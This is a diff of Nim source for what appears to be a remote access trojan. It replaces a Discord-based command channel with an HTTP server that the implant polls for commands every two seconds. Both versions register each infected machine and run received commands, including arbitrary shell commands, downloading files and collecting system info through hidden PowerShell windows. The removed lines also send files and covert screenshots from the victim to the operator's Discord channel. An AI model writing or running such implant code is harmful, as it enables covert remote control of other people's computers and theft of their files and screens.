@@ -1,9 +1,7 @@
-import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils, json, threadpool, streams, random
+import asyncdispatch, times, httpclient, osproc, os, strutils, json, threadpool, streams, random
 
 const
-  discordToken* = ""
-  creatorId* = ""
-let discord = newDiscordClient(discordToken)
+  serverUrl* = "http://localhost:8080"
 
 var
   currentDir = getCurrentDir()
@@ -51,31 +49,8 @@ proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.as
       discard execShellCmd("kill -9 " & $pidHolder[])
     return "Command timed out and was terminated after " & $(timeoutMs div 1000) & " seconds."
 
-proc sendMessage(channelId: string, content: string): Future[Message] {.async.} =
-    result = await discord.api.sendMessage(channelId, content)
-
-proc sendLongMessage(channelId: string, content: string): Future[void] {.async.} =
-  const maxLen = 1980 # Leave room for code block characters
-  if content.len == 0:
-    discard await discord.api.sendMessage(channelId, "```\n(Command executed with no output)\n```")
-  
-  var remaining = content
-  while remaining.len > 0:
-    let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
-    discard await discord.api.sendMessage(channelId, "```\n" & chunk & "\n```")
-    if remaining.len > maxLen:
-      remaining = remaining[maxLen .. ^1]
-    else:
-      remaining = ""
-
-proc sendFile(channelId: string, filePath: string, fileName: string): Future[void] {.async.} =
-    let fileContent = readFile(filePath)
-    discard await discord.api.sendMessage(
-        channelId,
-        files = @[DiscordFile(name: fileName, body: fileContent)]
-    )
-
-proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[string] {.async.} = 
+proc handleCommand(rawCmd: string, client: HttpClient): Future[string] {.async.} =
+ 
   let cmd = rawCmd.strip()
   if cmd == "!help":
     return """Available Commands:
@@ -111,8 +86,6 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
     return currentDir
 
   elif cmd == "!sysinfo":
-    var resultMsg: string
-    const maxLen = 1900
     when defined(linux):
       let (unameOut, unameExit) = execCmdEx("uname -a", options = {poUsePath}, workingDir = currentDir)
       let (lsbOut, lsbExit) = execCmdEx("bash -c \"lsb_release -d 2>/dev/null\"", options = {poUsePath}, workingDir = currentDir)
@@ -120,50 +93,25 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
         var info = unameOut
         if lsbExit == 0 and lsbOut.len > 0:
           info &= "\n" & lsbOut
-        var remaining = info
-        while remaining.len > 0:
-          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
-          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
-          if remaining.len > maxLen:
-            remaining = remaining[maxLen .. ^1]
-          else:
-            remaining = ""
-        resultMsg = "System info sent."
+        return info
       else:
-        resultMsg = "Failed to get system info: " & unameOut
+        return "Failed to get system info: " & unameOut
     elif defined(windows):
       let powershellScript = "Get-ComputerInfo | ConvertTo-Json"
       let command = "powershell -NoProfile -WindowStyle Hidden -Command \"" & powershellScript & "\""
       let (output, exitCode) = execCmdEx(command, options = {poUsePath}, workingDir = currentDir)
       if exitCode != 0:
-        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
+        return "command failed with exit code " & $exitCode & ":\n" & output
       else:
-        var remaining = output
-        while remaining.len > 0:
-          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
-          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
-          if remaining.len > maxLen:
-            remaining = remaining[maxLen .. ^1]
-          else:
-            remaining = ""
-        resultMsg = "System info sent."
+        return output
     elif defined(macosx):
       let (output, exitCode) = execCmdEx("system_profiler SPHardwareDataType", options = {poUsePath}, workingDir = currentDir)
       if exitCode != 0:
-        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
+        return "command failed with exit code " & $exitCode & ":\n" & output
       else:
-        var remaining = output
-        while remaining.len > 0:
-          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
-          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
-          if remaining.len > maxLen:
-            remaining = remaining[maxLen .. ^1]
-          else:
-            remaining = ""
-        resultMsg = "System info sent."
+        return output
     else:
-      resultMsg = "sysinfo not supported on this platform."
-    return resultMsg
+      return "sysinfo not supported on this platform."
 
   elif cmd.startsWith("!cd "):
     let newDir = cmd[3..^1].strip()
@@ -190,14 +138,6 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
       except CatchableError as e:
         return "failed to download file: " & e.msg
 
-  elif cmd.startsWith("!download "):
-    let fileName = cmd[9..^1].strip()
-    let filePath = joinPath(currentDir, fileName)
-    if fileExists(filePath):
-      await sendFile(m.channel_id, filePath, fileName)
-      return "download successful"
-    else:
-      return "file not found: " & filePath
 
   elif cmd.startsWith("!mkdir "):
     let dirName = cmd[6..^1].strip()
@@ -235,41 +175,6 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
     else:
       return "no such file or directory: " & path
 
-  elif cmd == "!screencapture":
-    when defined(macosx):
-      let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
-      let filePath = joinPath(currentDir, fileName)
-      let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
-      if exitCode == 0 and fileExists(filePath):
-        await sendFile(m.channel_id, filePath, fileName)
-        if fileExists(filePath):
-          removeFile(filePath)
-        return "screenshot taken, sent and deleted!"
-      else:
-        return "failed to take screenshot: " & output
-    elif defined(windows):
-      let fileName = "screenshot_" & $now().toTime().toUnix() & ".png"
-      let filePath = joinPath(currentDir, fileName)
-      let powershellScript = """
-          Add-Type -AssemblyName System.Windows.Forms
-          Add-Type -AssemblyName System.Drawing
-          $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-          $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-          $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-          $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-          $bitmap.Save('%1', [System.Drawing.Imaging.ImageFormat]::Png)
-      """
-      let command = "powershell -Command \"" & powershellScript.replace("%1", filePath.replace("\\", "\\\\")) & "\""
-      let (output, exitCode) = execCmdEx(command)
-      if exitCode == 0 and fileExists(filePath):
-        await sendFile(m.channel_id, filePath, fileName)
-        if fileExists(filePath):
-          removeFile(filePath)
-        return "Screenshot taken, sent and deleted!"
-      else:
-        return "failed to take screenshot: " & output
-    else:
-      return "screencapture not supported on this platform."
 
   else:
     try:
@@ -313,60 +218,51 @@ proc generateSessionId(): string =
 
 var machineName: string
 
-proc onReady(s: Shard, r: Ready) {.event(discord).} =
+proc httpServerMode() {.async.} =
+  echo "Starting HTTP server mode..."
   machineName = getEnv("MACHINE_NAME", generateSessionId())
-  if machineName notin sessionRegistry:
-    sessionRegistry.add(machineName)
+  
+  # Register with server
   try:
-    let dm = await discord.api.createUserDm(creatorId)
-    discard await discord.api.sendMessage(dm.id, machineName & " is live!")
-  except:
-    echo "Could not send startup message to creator ID: ", creatorId
-
-proc messageCreate(s: Shard, m: Message) {.event(discord).} =
-  var client = newHttpClient()
-  let content = m.content.strip()
-  echo "Processing command: ", content
-
-  if content == "!sessions":
-    let sessionList = if sessionRegistry.len == 0: "No active sessions." else: sessionRegistry.join("\n")
-    discard await sendMessage(m.channel_id, sessionList)
-    return
-  elif content == "!ping":
-    let before = epochTime() * 1000
-    let msg = await discord.api.sendMessage(m.channel_id, "ping?")
-    let after = epochTime() * 1000
-    discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")
+    let client = newHttpClient()
+    let data = "{\"hostname\":\"" & machineName & "\",\"status\":\"live\"}"
+    client.headers = newHttpHeaders({"Content-Type": "application/json"})
+    discard client.postContent(serverUrl & "/register", body = data)
+    echo machineName & " registered with HTTP server"
+  except Exception as e:
+    echo "Failed to register with HTTP server: ", e.msg
     return
   
-  if content.startsWith("!") and not content.startsWith("!sessions") and not content.startsWith("!ping"):
-    let parts = content.split(' ', 1)
-    let firstWord = parts[0]
-    let isTargeted = firstWord.len > 1 and firstWord.startsWith("!") and not firstWord.startsWith("!!")
-
-    if isTargeted:
-      # Command is like "!session-name !command"
-      let targetName = firstWord[1..^1]
-
-      if targetName == machineName:
-        let commandToRun = if parts.len > 1: parts[1].strip() else: ""
-        if commandToRun.len > 0 and commandToRun.startsWith("!"):
-          try:
-            let output = await handleCommand(commandToRun, m, client)
-            if output.len > 0:
-              await sendLongMessage(m.channel_id, output)
-          except CatchableError as e:
-            discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)
-        else:
-          discard await sendMessage(m.channel_id, machineName & " is here!")
-    else:
-      try:
-        let output = await handleCommand(content, m, client)
-        if output.len > 0:
-          await sendLongMessage(m.channel_id, output)
-      except CatchableError as e:
-        echo "Error executing command: ", e.msg
-        discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)
+  # Poll for commands
+  while true:
+    try:
+      let client = newHttpClient()
+      let response = client.getContent(serverUrl & "/commands/" & machineName)
+      if response.len > 0:
+        let cmdData = parseJson(response)
+        if cmdData.hasKey("command"):
+          let cmd = cmdData["command"].getStr()
+          echo "Received command: ", cmd
+          let output = await handleCommand(cmd, client)
+          # Send response back
+          let respData = "{\"hostname\":\"" & machineName & "\",\"output\":\"" & output.replace("\"", "\\\"") & "\"}"
+          client.headers = newHttpHeaders({"Content-Type": "application/json"})
+          discard client.postContent(serverUrl & "/response", body = respData)
+    except Exception as e:
+      echo "Error in command loop: ", e.msg
+    await sleepAsync(2000)  # Poll every 2 seconds
 
 proc main() =
-  waitFor discord.startSession()
+  if serverUrl.len == 0:
+    echo "Error: Server URL not configured"
+    return
+  
+  try:
+    let client = newHttpClient()
+    discard client.getContent(serverUrl & "/ping")
+    echo "HTTP server is available at: ", serverUrl
+    waitFor httpServerMode()
+  except Exception as e:
+    echo "Failed to connect to HTTP server: ", e.msg
+    echo "Please check server URL and ensure server is running"
+
